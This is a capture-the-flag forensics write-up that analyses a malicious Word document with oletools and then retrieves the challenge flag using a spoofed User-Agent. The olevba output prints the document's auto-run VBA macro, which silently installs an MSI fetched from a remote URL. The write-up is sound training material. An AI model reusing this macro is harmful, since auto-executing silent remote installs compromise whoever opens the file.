# DR. Mal

We were provided an archive file called `drmal.zip` which contained a Word Document called `Mal.doc`. Since this was Forensics challenge and the document was called `Mal.doc`, it was safe to assume that this was a malicious document.

To analyse this malicious document, I first ran `oleid` from [oletools](https://github.com/decalage2/oletools) to analyse the document.
```console
$ oleid Mal.doc
oleid 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: Mal.doc
WARNING  For now, VBA stomping cannot be detected for files in memory
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description
--------------------+--------------------+----------+--------------------------
File format         |Unknown file type   |info      |
--------------------+--------------------+----------+--------------------------
Container format    |Unknown Container   |info      |Container type
--------------------+--------------------+----------+--------------------------
Encrypted           |False               |none      |The file is not encrypted
--------------------+--------------------+----------+--------------------------
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA
                    |                    |          |macros. Suspicious
                    |                    |          |keywords were found. Use
                    |                    |          |olevba and mraptor for
                    |                    |          |more info.
--------------------+--------------------+----------+--------------------------
XLM Macros          |No                  |none      |This file does not contain
                    |                    |          |Excel 4/XLM macros.
--------------------+--------------------+----------+--------------------------
External            |0                   |none      |External relationships
Relationships       |                    |          |such as remote templates,
                    |                    |          |remote OLE objects, etc
--------------------+--------------------+----------+--------------------------
```

As seen in the output above, this document contains VBA macros. As stated in the output, we can use utilize `olevba` to get more info about the VBA macro.

```
$ olevba Mal.doc
olevba 0.60.1 on Python 3.11.5 - http://decalage.info/python/oletools
===============================================================================
FILE: Mal.doc
Type: MHTML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: None - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    On Error Resume Next
    iceCube = "WindowsInstaller.Installer"
    Dim eazyE As Object
    Set eazyE = CreateObject(iceCube)
    eazyE.UILevel = 2
    snoopDogg = "https://drmal.io.ept.gg/flagInstaller.msi"
    eazyE.InstallProduct snoopDogg
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|IOC       |https://drmal.io.ept|URL                                          |
|          |.gg/flagInstaller.ms|                                             |
|          |i                   |                                             |
|IOC       |flagInstaller.msi   |Executable file name                         |
+----------+--------------------+---------------------------------------------+
```

From the output above, we are able to see the VBA macro. The macro of interrest is `MyMacro` as it creates a Windows Installer object to install `flagInstaller.msi` from `https://drmal.io.ept.gg/flagInstaller.msi`. 

Upon doing a GET request to the given URL we get the following output
```console
$ curl https://drmal.io.ept.gg/flagInstaller.msi
Invalid User-Agent
```

From the output it seems like we need to find a valid User-Agent in order to see the content. Since its the Windows Installer thats fetching the data, I decided to find the correct User Agent used by the Windows Installer.

By searching for `user agent for windows installer`, I found the following post: https://www.dropboxforum.com/t5/View-download-and-export/Configure-trusted-client-user-agents-Windows-Installer-user/td-p/582721

In this post, its mentioned that the User-Agent is `Windows Installer`. By using User Agent in our GET request, we are able to fetch the flag:

```console
$ curl -s https://drmal.io.ept.gg/flagInstaller.msi -H "User-Agent: Windows Installer"
EPT{mAlD0c_c0mIn_sTr4igHt_0utt4_jAEr3n}
```
